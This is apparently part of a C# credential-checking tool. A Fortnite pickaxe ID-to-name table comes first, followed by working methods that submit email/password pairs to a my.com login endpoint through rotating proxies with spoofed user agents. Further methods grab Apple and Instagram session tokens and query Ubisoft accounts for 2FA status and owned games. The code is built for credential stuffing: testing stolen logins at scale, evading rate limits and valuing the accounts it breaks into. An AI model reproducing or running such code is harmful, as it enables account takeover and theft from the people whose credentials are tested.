  "pickaxe_id_278_brightgunnerremix1h",
  "brite bashers"
},
{
  "pickaxe_id_279_malellamaheromilitia",
  "razor smash"
},
{
  "pickaxe_id_280_mascotmilitiacuddle1h",
  "snack attackers"
},
{
  "pickaxe_id_281_bulletbluefemale",
  "swell striker"
},
{
  "pickaxe_id_282_codsquadplaidfemale",
  "spurred swinger"
},
{
  "pickaxe_id_283_codsquadplaidmale",
  "utility axe"
},
{
  "pickaxe_id_284_crazyeight1h",
  "bank shots"
},
{
  "pickaxe_id_285_cuddleteamdark",
  "snuggle swiper"
},
{
  "pickaxe_id_286_fishermanfemale1h",
  "heavy hooks"
},
{
  "pickaxe_id_287_rockclimber1h",
  "boulder breakers"
},
{
  "pickaxe_id_288_rebirthmedicfemale",
  "medaxe"
},
{
  "pickaxe_id_289_redridingremixfemale",
  "big bad axe"
},
{
  "pickaxe_id_290_sheath1h",
  "highlight strikers"
},
{
  "pickaxe_id_291_slurpmonster",
  "sludgehammer"
},
{
  "pickaxe_id_292_tacticalfisherman1h",
  "angler axes"
},
{
  "pickaxe_id_293_viper",
  "fusion scythe"
},
{
  "pickaxe_id_294_candycane",
  "merry mint axe"
},
{
  "pickaxe_id_295_darkdino1h",
  "dark dino bones"
},
{
  "pickaxe_id_296_devilrockmale1h",
  "burning blades"
},
{
  "pickaxe_id_297_flowerskeletonfemale1h",
  "blooming bones"
},
{
  "pickaxe_id_298_freak1h",
  "gnashers"
},
{
  "pickaxe_id_299_goatrobe",
  "spellbound staff"
},
{
  "pickaxe_id_300_mastermind",
  "chaos scythe"
},
{
  "pickaxe_id_301_modernwitch",
  "witchia axe"
},
{
  "pickaxe_id_302_tourbus1h",
  "dual katanas"
},
{
  "pickaxe_id_303_nosh",
  "globber"
},
{
  "pickaxe_id_304_noshhunter1h",
  "stickers"
},
{
  "pickaxe_id_305_phantom1h",
  "cursed claws"
},
{
  "pickaxe_id_306_punkdevil",
  "starshot"
},
{
  "pickaxe_id_307_skeletonhunter",
  "spectral scythe"
},
{
  "pickaxe_id_308_spookyneonmale",
  "ultra scythe"
},
{
  "pickaxe_id_309_storm",
  "storm king fist"
},
{
  "pickaxe_id_310_submarinermale",
  "depth charger"
},
{
  "pickaxe_id_311_jetskifemale1h",
  "dual filet"
},
{
  "pickaxe_id_312_jetskimale1h",
  "piranhas"
},
{
  "pickaxe_id_314_weepingwoodsmale1h",
  "honey hitters"
},
{
  "pickaxe_id_315_banefemale1h",
  "party crashers"
},
{
  "pickaxe_id_316_bigchuggus",
  "double tap"
},
{
  "pickaxe_id_317_bonesnake1h",
  "bone fangs"
},
{
  "pickaxe_id_318_bulletbluemale",
  "bullet slash"
},
{
  "pickaxe_id_319_cavalrybanditfemale1h",
  "silent strike"
},
{
  "pickaxe_id_320_forestdwellermale",
  "bark basher"
},
{
  "pickaxe_id_321_forestqueenfemale1h",
  "smashrooms"
},
{
  "pickaxe_id_322_frogmanmale",
  "sea scorpion"
},
{
  "pickaxe_id_323_pinktroopermale1h",
  "spiked mace"
},
{
  "pickaxe_id_324_northpole",
  "polar poleaxe"
},
{
  "pickaxe_id_325_festivepugmale",
  "holiday ham"
},
{
  "pickaxe_id_326_galileoferry1h_f5iua",
  "riot control baton"
},
{
  "pickaxe_id_327_galileokayak_50nfg",
  "vibro-scythe"
},
{
  "pickaxe_id_328_galileorocket_snc0l",
  "rey's quarterstaff"
},
{
  "pickaxe_id_329_gingerbreadcookie1h",
  "shortbread slicers"
},
{
  "pickaxe_id_330_holidaytimemale",
  "branch basher"
},
{
  "pickaxe_id_331_kanemale1h",
  "candy cleavers"
},
{
  "pickaxe_id_332_mintminer",
  "peppermint pick"
},
{
  "pickaxe_id_333_msalpinefemale1h",
  "pinkaxe"
},
{
  "pickaxe_id_334_sweaterweathermale",
  "snowy"
},
{
  "pickaxe_id_335_tacticalbearmale1h",
  "fishicles"
},
{
  "pickaxe_id_336_tntinafemale",
  "tnteeth"
},
{
  "pickaxe_id_337_wingedfuryfemale",
  "frost blade"
},
{
  "pickaxe_id_339_codsquadhoodie",
  "wild accent"
},
{
  "pickaxe_id_340_dragonracerfemale",
  "dragon's breath"
},
{
  "pickaxe_id_341_frogmanfemale1h",
  "twilight strikers"
},
{
  "pickaxe_id_342_gummimale1h",
  "scampi"
},
{
  "pickaxe_id_343_hoodiebanditfemale",
  "pop axe"
},
{
  "pickaxe_id_344_martialartistmale",
  "rogue wave"
},
{
  "pickaxe_id_345_modernmilitaryeclipse",
  "shadow caliper"
},
{
  "pickaxe_id_346_neongraffiti",
  "street shine"
},
{
  "pickaxe_id_348_sharkattackmale",
  "underbite"
},
{
  "pickaxe_id_349_streetratmale1h",
  "lucky axes"
},
{
  "pickaxe_id_350_thegoldenskeleton",
  "gilded scepter"
},
{
  "pickaxe_id_351_tigerfashionfemale1h",
  "tiger claws"
},
{
  "pickaxe_id_352_virtualshadowmale1h",
  "smolders"
},
{
  "pickaxe_id_353_agentace1h",
  "serrated slicers"
},
{
  "pickaxe_id_354_agentrogue1h",
  "chargers"
},
{
  "pickaxe_id_355_buffcatmale1h",
  "solid scratch"
},
{
  "pickaxe_id_356_candymale",
  "heart beater"
},
{
  "pickaxe_id_357_catburglarmale",
  "golden king"
},
{
  "pickaxe_id_358_cuteduomale",
  "heavy heart"
},
{
  "pickaxe_id_359_cyclonemale",
  "diamond jack"
},
{
  "pickaxe_id_360_desertopscamofemale",
  "specialist pickaxe"
},
{
  "pickaxe_id_361_henchmanmale1h",
  "hack & smash"
},
{
  "pickaxe_id_362_lollipopfemale",
  "punchline"
},
{
  "pickaxe_id_363_lollipoptricksterfemale",
  "harley hitter"
},
{
  "pickaxe_id_364_photographerfemale1h",
  "epic swords of wonder"
},
{
  "pickaxe_id_365_spytechhackermale",
  "codaxe"
},
{
  "pickaxe_id_366_spymale1h",
  "butterfly knives"
},
{
  "pickaxe_id_367_winterhunter",
  "diamond eye"
},
{
  "pickaxe_id_368_bananaagent",
  "bananaxe"
},
{
  "pickaxe_id_369_anarchyacresfarmer",
  "power pitch"
},
{
  "pickaxe_id_370_blueflames",
  "drip axe"
},
{
  "pickaxe_id_371_pineapplebandit1h",
  "piña clobbers"
},
{
  "pickaxe_id_372_streetfashionemeraldfemale1h",
  "silver strikers"
},
{
  "pickaxe_id_373_teriyakifishassassin1h",
  "fresh fish"
},
{
  "pickaxe_id_374_twindarkfemale1h",
  "inversion blades"
},
{
  "pickaxe_id_375_agentxfemale1h",
  "volt batons"
},
{
  "pickaxe_id_376_fncs",
  "axe of champions"
},
{
  "pickaxe_id_377_spytechfemale1h",
  "double dagger"
},
{
  "pickaxe_id_378_spytechmale1h",
  "plasma circuit"
},
{
  "pickaxe_id_379_tailormale1h",
  "bespoke blades"
},
{
  "pickaxe_id_380_targetpracticemale",
  "firing line"
},
{
  "pickaxe_id_381_cardboardcrew",
  "box basher"
},
{
  "pickaxe_id_382_donut1h",
  "meaty mallets"
},
{
  "pickaxe_id_383_handymanmale",
  "bionic synapse"
},
{
  "pickaxe_id_384_informermale1h",
  "harmonic flux"
},
{
  "pickaxe_id_385_badeggmale",
  "steel shadow"
},
{
  "pickaxe_id_386_cometmale",
  "regal floof"
},
{
  "pickaxe_id_387_donutcup",
  "unstoppable force"
},
{
  "pickaxe_id_388_donutdish1h",
  "probability daggers"
},
{
  "pickaxe_id_389_donutplate1h",
  "psi-blade"
},
{
  "pickaxe_id_390_femalehitman1h",
  "xo axes"
},
{
  "pickaxe_id_391_graffitiassassinfemale",
  "venom blade"
},
{
  "pickaxe_id_392_hostile",
  "thorn"
},
{
  "pickaxe_id_393_neoncatspyfemale",
  "purr axe"
},
{
  "pickaxe_id_394_raveninjafemale1h",
  "light knives"
},
{
  "pickaxe_id_395_splintermale1h",
  "reflex blades"
},
{
  "pickaxe_id_396_rapvillainessfemale1h",
  "double gold"
},
{
  "pickaxe_id_397_techexplorermale1h",
  "agile edge"
},
{
  "pickaxe_id_398_wildcatfemale",
  "electri-claw"
},
{
  "pickaxe_id_399_loofahfemale1h",
  "fruit punchers"
},
{
  "pickaxe_id_400_aquajacketmale",
  "wavecrest"
},
{
  "pickaxe_id_401_beaconmale",
  "heavy hook"
},
{
  "pickaxe_id_402_blackknightfemale1h",
  "reliant blades"
},
{
  "pickaxe_id_403_cavalrybanditshadow1h",
  "shadow blades"
},
{
  "pickaxe_id_404_gatormale",
  "swamp slicer"
},
{
  "pickaxe_id_407_heistshadow",
  "gold crow"
},
{
  "pickaxe_id_408_mastermindshadow",
  "mayhem scythe"
},
{
  "pickaxe_id_409_mechanicalengineer1h",
  "wrenchers"
},
{
  "pickaxe_id_410_oceanriderfemale1h",
  "tide axes"
},
{
  "pickaxe_id_411_partygoldmale",
  "weathered gold"
},
{
  "pickaxe_id_412_professorpupmale1h",
  "power claws"
},
{
  "pickaxe_id_413_pythonfemale1h",
  "fearless fangs"
},
{
  "pickaxe_id_414_racerzero",
  "eon blades"
},
{
  "pickaxe_id_415_sandcastlemale",
  "aquaman's trident"
},
{
  "pickaxe_id_416_spacewandererfemale1h",
  "vizion strikers"
},
{
  "pickaxe_id_417_tacticalscubamale1h",
  "dive knives"
},
{
  "pickaxe_id_418_cupiddarkfemale1h",
  "bewitching blades"
},
{
  "pickaxe_id_419_jonesyvagabondmale1h",
  "snax"
},
{
  "pickaxe_id_420_candyapplesour_jxbza",
  "proto-adamantium shield"
},
{
  "pickaxe_id_421_candysummerfemale1h",
  "lil' sweeties"
},
{
  "pickaxe_id_422_golfsummerfemale",
  "hook slicer"
},
{
  "pickaxe_id_423_greenjacketfemale1h",
  "block blades"
},
{
  "pickaxe_id_424_heartbreakerfemale1h",
  "flail blades"
},
{
  "pickaxe_id_425_mswhipfemale1h",
  "two scoops"
},
{
  "pickaxe_id_426_punkdevilsummerfemale",
  "starstruck axe"
},
{
  "pickaxe_id_427_seaweed1h_cz9ha",
  "manta blades"
},
{
  "pickaxe_id_428_sharksuitmale1h",
  "sharky slappers"
},
{
  "pickaxe_id_429_celestialfemale1h",
  "stardust strikers"
},
{
  "pickaxe_id_430_dirtydocksfemale",
  "tri-hook"
},
{
  "pickaxe_id_431_dirtydocksmale1h",
  "sawtooth slashers"
},
{
  "pickaxe_id_432_dummeez",
  "noggin"
},
{
  "pickaxe_id_433_lawngnome",
  "gnomax"
},
{
  "pickaxe_id_434_militaryfashionsummermale1h",
  "iron claws"
},
{
  "pickaxe_id_435_teriyakiatlantismale1h",
  "fish sticks"
},
{
  "pickaxe_id_436_anglerfemale1h",
  "trench blades"
},
{
  "pickaxe_id_438_antillamafemale",
  "llama's bane"
},
{
  "pickaxe_id_439_axlmale",
  "axe-olotl"
},
{
  "pickaxe_id_440_floatillacaptainmale1h",
  "scoop shot"
},
{
  "pickaxe_id_441_islanderfemale",
  "tropic axe"
},
{
  "pickaxe_id_442_ladyatlantisfemale",
  "lapis trident"
},
{
  "pickaxe_id_443_maskeddancermale",
  "street blade"
},
{
  "pickaxe_id_444_multibotstealth1h",
  "shadow combo cleavers"
},
{
  "pickaxe_id_445_raiderpinkfemale1h",
  "pom pummelers"
},
{
  "pickaxe_id_446_seasalt",
  "hulk smashers"
},
{
  "pickaxe_id_447_spacewanderermale",
  "shooting starstaff"
},
{
  "pickaxe_id_448_sportsfashionfemale1h",
  "cyclo sticks"
},
{
  "pickaxe_id_449_triplescoopfemale",
  "bucky bat"
},
{
  "pickaxe_id_450_valet",
  "hi-octane"
},
{
  "pickaxe_id_451_darkeaglepurple",
  "dread oracle axe"
},
{
  "pickaxe_id_452_darkninjapurple1h",
  "dread strikers"
},
{
  "pickaxe_id_453_hightowerdate",
  "staff of doom"
},
{
  "pickaxe_id_454_hightowergrapemale1h",
  "groot's sap axes"
},
{
  "pickaxe_id_455_hightowerhoneydew1h",
  "hammers of justice"
},
{
  "pickaxe_id_456_hightowermango1h",
  "gilded morphic blades"
},
{
  "pickaxe_id_457_hightowersquash1h",
  "hand of lightning"
},
{
  "pickaxe_id_458_hightowertapas1h",
  "mjolnir"
},
{
  "pickaxe_id_459_hightowertomato1h",
  "mark 85 energy blade"
},
{
  "pickaxe_id_460_hightowerwasabi1h",
  "adamantium claws"
},
{
  "pickaxe_id_461_skullbritecube",
  "dark splitter"
},
{
  "pickaxe_id_462_soy_4cw52",
  "silver surfer pickaxe"
},
{
  "pickaxe_id_463_elastic1h",
  "phantasmic pulse"
},
{
  "pickaxe_id_464_longshortsmale",
  "perfect point"
},
{
  "pickaxe_id_465_backspinmale1h_r40e7",
  "sword of the daywalker"
},
{
  "pickaxe_id_466_cavalryfemale1h",
  "stake & stalker"
},
{
  "pickaxe_id_469_mythfemale",
  "hunting song"
},
{
  "pickaxe_id_470_mythmale1h",
  "destiny's edge"
},
{
  "pickaxe_id_471_streetfashiongarnetfemale",
  "tangerine terror"
},
{
  "pickaxe_id_473_vampirecasualfemale",
  "vamp axe"
},
{
  "pickaxe_id_474_blackwidowjacketfemale",
  "webspinner's slice"
},
{
  "pickaxe_id_476_darkbombersummerfemale",
  "dark days"
},
{
  "pickaxe_id_477_delisandwichmale1h",
  "daredevil's billy clubs"
},
{
  "pickaxe_id_478_flowerskeletonmale1h",
  "blooming doom"
},
{
  "pickaxe_id_480_poisonfemale",
  "forsaken strike"
},
{
  "pickaxe_id_481_spookyneonfemale1h",
  "grim axes"
},
{
  "pickaxe_id_stw001_tier_1",
  "ol' woody"
},
{
  "pickaxe_id_stw002_tier_3",
  "tech axe"
},
{
  "pickaxe_id_stw003_tier_4",
  "hydraulic wrecker"
},
{
  "pickaxe_id_stw004_tier_5",
  "vindertech elite"
},
{
  "pickaxe_id_stw005_tier_6",
  "laser pick"
},
{
  "pickaxe_id_stw006_tier_7",
  "axehammer"
},
{
  "pickaxe_id_stw007_basic",
  "basic basher"
},
{
  "pickaxe_lockjaw",
  "raider's revenge"
},
{
  "sicklebatpickaxe",
  "batsickle"
},
{
  "skiicepickaxe",
  "cliffhanger"
},
{
  "spikypickaxe",
  "spiky}"
},        };
	

	private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = psn1check.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					Interlocked.Increment(ref psn1check.Errors);
				}
			}
			return "";
		}
		private readonly Random _random = new Random();
		private static string RandomString(int length)
		{
			const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var builder = new StringBuilder();

			for (var i = 0; i < length; i++)
			{
				var c = pool[random.Next(0, pool.Length)];
				builder.Append(c);
			}

			return builder.ToString();
		}
		private static string BuildLRPattern(string ls, string rs)
		{
			var left = string.IsNullOrEmpty(ls) ? "^" : Regex.Escape(ls); // Empty LEFT = start of the line
			var right = string.IsNullOrEmpty(rs) ? "$" : Regex.Escape(rs); // Empty RIGHT = end of the line
			return "(?<=" + left + ").+?(?=" + right + ")";
		}
		public static IEnumerable<string> LR(string input, string left, string right, bool recursive = false, bool useRegex = false)
		{
			// No L and R = return full input
			if (left == string.Empty && right == string.Empty)
			{
				return new string[] { input };
			}

			// L or R not present and not empty = return nothing
			else if (((left != string.Empty && !input.Contains(left)) || (right != string.Empty && !input.Contains(right))))
			{
				return new string[] { };
			}

			var partial = input;
			var pFrom = 0;
			var pTo = 0;
			var list = new List<string>();

			if (recursive)
			{
				if (useRegex)
				{
					try
					{
						var pattern = BuildLRPattern(left, right);
						MatchCollection mc = Regex.Matches(partial, pattern);
						foreach (Match m in mc)
							list.Add(m.Value);
					}
					catch { }
				}
				else
				{
					try
					{
						while (left == string.Empty || (partial.Contains(left)) && (right == string.Empty || partial.Contains(right)))
						{
							// Search for left delimiter and Calculate offset
							pFrom = left == string.Empty ? 0 : partial.IndexOf(left) + left.Length;
							// Move right of offset
							partial = partial.Substring(pFrom);
							// Search for right delimiter and Calculate length to parse
							pTo = right == string.Empty ? (partial.Length - 1) : partial.IndexOf(right);
							// Parse it
							var parsed = partial.Substring(0, pTo);
							list.Add(parsed);
							// Move right of parsed + right
							partial = partial.Substring(parsed.Length + right.Length);
						}
					}
					catch { }
				}
			}

			// Non-recursive
			else
			{
				if (useRegex)
				{
					var pattern = BuildLRPattern(left, right);
					MatchCollection mc = Regex.Matches(partial, pattern);
					if (mc.Count > 0) list.Add(mc[0].Value);
				}
				else
				{
					try
					{
						pFrom = left == string.Empty ? 0 : partial.IndexOf(left) + left.Length;
						partial = partial.Substring(pFrom);
						pTo = right == string.Empty ? partial.Length : partial.IndexOf(right);
						list.Add(partial.Substring(0, pTo));
					}
					catch { }
				}
			}

			return list;
		}
		static string AppleGetToken(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = psn1check.RandomProxies();
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
						httpRequest.AddHeader("Accept", "*/*");

						string strResponse = httpRequest.Get(new Uri("https://secure4.store.apple.com/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ")).ToString();

						if (strResponse.Contains("stk\":\""))
						{
							return Regex.Match(strResponse, "stk\":\"(.*?)\"}").Groups[1].Value;
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref psn1check.retry);
				}
			}
		}

		public int RandomNumber(int min, int max)
		{
			return _random.Next(min, max);
		}

		static Random random = new Random();
		public string RandomString(int size, bool lowerCase = false)
		{
			var builder = new StringBuilder(size);

			// char is a single Unicode character  
			char offset = lowerCase ? 'a' : 'A';
			const int lettersOffset = 26; // A...Z or a..z: length = 26  

			for (var i = 0; i < size; i++)
			{
				var @char = (char)_random.Next(offset, offset + lettersOffset);
				builder.Append(@char);
			}

			return lowerCase ? builder.ToString().ToLower() : builder.ToString();
		}
		public string RandomPassword()
		{
			var passwordBuilder = new StringBuilder();

			// 4-Digits between 1000 and 9999  
			passwordBuilder.Append(RandomNumber(1000, 9999));

			// 2-Letters upper case  
			passwordBuilder.Append(RandomString(2));
			return passwordBuilder.ToString();
		}
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}


		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = psn1check.RandomProxies();
						req.AddHeader("Ubi-SessionId", sessionId);
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string str = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
						if (str.Contains("active"))
						{
							if (str.Contains("true"))
								return "true";
							if (str.Contains("false"))
								return "false";
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref psn1check.retry);
				}
			}
		}

		private static string UPlayGetGames(string ticket)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = psn1check.RandomProxies();
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string input = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
						if (input.Contains("[") && input != "[]")
						{
							Match match1 = Regex.Match(input, "\"slug\":\"(.*?)\"");
							Match match2 = Regex.Match(input, "\"platform\":\"(.*?)\"");
							string str1 = "";
							string str2;
							while (true)
							{
								str2 = str1 + "[" + match1.Groups[1].Value + " - " + match2.Groups[1].Value + "]";
								match1 = match1.NextMatch();
								match2 = match2.NextMatch();
								if (!(match1.Groups[1].Value == ""))
									str1 = str2 + ", ";
								else
									break;
							}
							return str2;
						}
					}
				}
				catch
				{
				}
			}
		}

		private static string InstagramGetCSRF(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = psn1check.RandomProxies();
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = false;
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
						httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
						return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
					}
				}
				catch
				{
					Interlocked.Increment(ref psn1check.retry);
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string uri = "";

		public static string auther = "";

		public static string showbad = "";

		public static string showlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
